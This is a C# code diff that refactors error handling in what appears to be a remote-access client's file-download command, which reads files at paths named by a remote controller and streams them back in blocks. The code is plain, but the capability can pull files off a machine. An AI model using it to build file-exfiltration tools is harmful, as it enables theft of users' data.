@@ -101,12 +101,7 @@ namespace xClient.Core.Commands
                 {
                     FileSplit srcFile = new FileSplit(command.RemotePath);
                     if (srcFile.MaxBlocks < 0)
-                    {
-                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
-                            srcFile.LastError).Execute(client);
-                        _limitThreads.Release();
-                        return;
-                    }
+                        throw new Exception(srcFile.LastError);
 
                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                     {
@@ -114,23 +109,18 @@ namespace xClient.Core.Commands
                             break;
 
                         byte[] block;
-                        if (srcFile.ReadBlock(currentBlock, out block))
-                        {
-                            new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
-                                Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
-                                srcFile.LastError).Execute(client);
-                        }
-                        else
-                        {
-                            new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
-                                srcFile.LastError).Execute(client);
-                            break;
-                        }
+
+                        if (!srcFile.ReadBlock(currentBlock, out block))
+                            throw new Exception(srcFile.LastError);
+
+                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
+                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
+                            srcFile.LastError).Execute(client);
                     }
                 }
                 catch (Exception ex)
                 {
-                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
+                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message)
                         .Execute(client);
                 }
                 _limitThreads.Release();
@@ -142,7 +132,7 @@ namespace xClient.Core.Commands
             if (!_canceledDownloads.ContainsKey(command.ID))
             {
                 _canceledDownloads.Add(command.ID, "canceled");
-                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
+                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
             }
         }
 
